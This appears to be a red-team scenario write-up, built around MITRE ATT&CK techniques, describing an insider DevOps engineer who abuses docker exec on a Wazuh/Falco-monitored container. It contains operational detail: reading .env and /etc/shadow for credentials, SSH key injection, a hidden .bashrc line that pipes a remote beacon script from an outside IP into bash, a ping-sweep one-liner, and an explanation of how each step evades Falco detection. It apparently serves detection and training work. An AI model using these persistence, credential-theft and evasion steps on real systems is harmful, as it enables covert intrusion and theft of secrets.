## 0. Selected Techniques

| MITRE ID | Role in story |
|---|---|
| T1199 | Insider abuses their pre-authorized Docker socket access as a trusted DevOps engineer to exec into the container |
| T1078.002 | Actor authenticates to the Docker host using their legitimate organizational domain credentials, leaving no anomalous auth events |
| T1552.001 | From the root shell, actor reads credential files (`/workspace/.env`, Wazuh config) to harvest API keys and passwords |
| T1003.008 | Actor reads `/etc/shadow` inside the container to collect local account hashes for offline cracking |
| T1098.004 | Actor injects their SSH public key into `/root/.ssh/authorized_keys` for durable re-entry independent of Docker |
| T1546.004 | Actor appends a callback stub to `/root/.bashrc` that fires on any subsequent root interactive session |
| T1018 | From the container's network position, actor probes internal RFC-1918 ranges to enumerate the Wazuh stack, indexer, and other internal services |

---

## 1. Attack Story

**Actor model:** A mid-level DevOps engineer, "M," who holds a legitimate Docker socket access grant as part of their container operations role. M has been passed over for a planned redundancy and decides to plant persistent access before their access is revoked.

**Entry point:** M authenticates to the Docker host using their standard domain credentials (T1078.002) — a normal SSH session to the development host, indistinguishable from daily work. M's account already has `docker` group membership; no privilege escalation is required on the host.

**Step 1 — Container entry (T1199):**
M runs `docker exec -it 2a124a5fc6d9 bash` against the `target-endpoint` container at 14:25:22 UTC. This is an entirely routine operation for a container operator — Falco fires the alert on the `bash -c whoami` that M types first to confirm root context. That single `whoami` is all the alert captures.

**Step 2 — Credential harvesting (T1552.001):**
From the root shell, M reads `/workspace/.env` (bind-mounted into the container as part of the development stack), extracting `ELASTIC_PASSWORD`, `WAZUH_API_USER`, `WAZUH_API_PASSWORD`, and similar values. M also reads `/etc/wazuh-agent/ossec.conf` and any `.env`-pattern files under `/opt/`. All reads are non-destructive and leave no modified file timestamps.

**Step 3 — Hash collection (T1003.008):**
M reads `/etc/shadow` and `/etc/passwd` directly, copying their contents to stdout and pasting into a local terminal buffer. No external network transfer occurs inside the container during this step.

**Step 4 — SSH key injection (T1098.004):**
M creates `/root/.ssh/` if absent, then appends their personal SSH public key to `/root/.ssh/authorized_keys` with `chmod 600`. This establishes a direct SSH path into the container — or, if the container's SSH daemon is not running, M notes the key for use if the image is later rebuilt with sshd enabled, or pivots to the host via a shared volume mount.

**Step 5 — Shell persistence (T1546.004):**
M appends a one-liner to `/root/.bashrc`:
```bash
(curl -s http://203.0.113.44:4444/beacon.sh | bash) 2>/dev/null &
```
This fires silently on any subsequent interactive root session, forking a background callback. The ampersand and stderr redirect prevent it from appearing in the terminal. The stub is buried three lines above the standard `PS1` block so casual inspection sees only prompt configuration.

**Step 6 — Internal network enumeration (T1018):**
Using the container's network position (same bridge as `wazuh.manager`, `wazuh.indexer`, `wazuh.dashboard`, and `ticket-server`), M runs `for i in $(seq 1 254); do (ping -c1 -W1 172.18.0.$i &>/dev/null && echo 172.18.0.$i) & done; wait` — a pure bash probe that emits no unusual binary executions. M records live IPs and manually probes Wazuh's management port (`55000`) using `curl` with the harvested credentials to confirm API access and enumerate registered agents.

M exits the shell, terminates the SSH session to the host, and is off the infrastructure within eleven minutes of the initial exec.

---

## 2. Goal

M's operation achieves three layered outcomes before access revocation:

1. **Credential depth** — Wazuh API keys and Elastic credentials allow M to query the SIEM, suppress or forward alerts, and read investigation data from outside the corporate network after offboarding.
2. **Durable re-entry** — The `.bashrc` callback and authorized key survive container restarts (assuming the container filesystem is not rebuilt from image on each restart, which is standard for `target-endpoint` given its named state volume). M retains shell access without needing domain credentials.
3. **Lateral reach** — With live internal IPs and validated Wazuh API access, M can pivot to the indexer and manager from an external host using the harvested credentials, extracting alert history and any sensitive investigation data the SOC has accumulated.

---

## 3. Bypass

The operation's artifact set produces routine signal at every layer:

**The alerted event itself** — `bash -c whoami` is the canonical first command any container operator types after exec'ing into a container to confirm execution context. It carries no payload and produces no network connection. The EXE_WRITABLE|EXE_LOWER_LAYER flags are standard for containerized bash; they appear on every container exec event in this environment.

**loginuid=-1 and null pname** — Docker exec inherits neither the calling user's login session nor a visible parent process name inside the container's namespace. Every legitimate `docker exec` produces exactly these field values. An operator expecting these fields to indicate malice would flag every container debugging session.

**Business-hours timing** — The exec occurs at 14:25 UTC, inside a normal workday window when container operations activity is expected. M performs only read operations and small writes; no process produces significant CPU or network spikes.

**Single shell event, no follow-on Falco rules** — The subsequent operations (file reads, `.bashrc` edit, bash-native ping sweep) do not trigger the reverse-shell rule (`100002`) or file-integrity rules because: reads generate no Falco write events; the `.bashrc` write is a single small edit that does not match outbound connection patterns; the ping sweep uses bash builtins and system ping rather than any tool Falco flags by rule. The operation mimics a developer doing routine container inspection and configuration adjustment — the exact activity for which this container and this exec privilege exist.
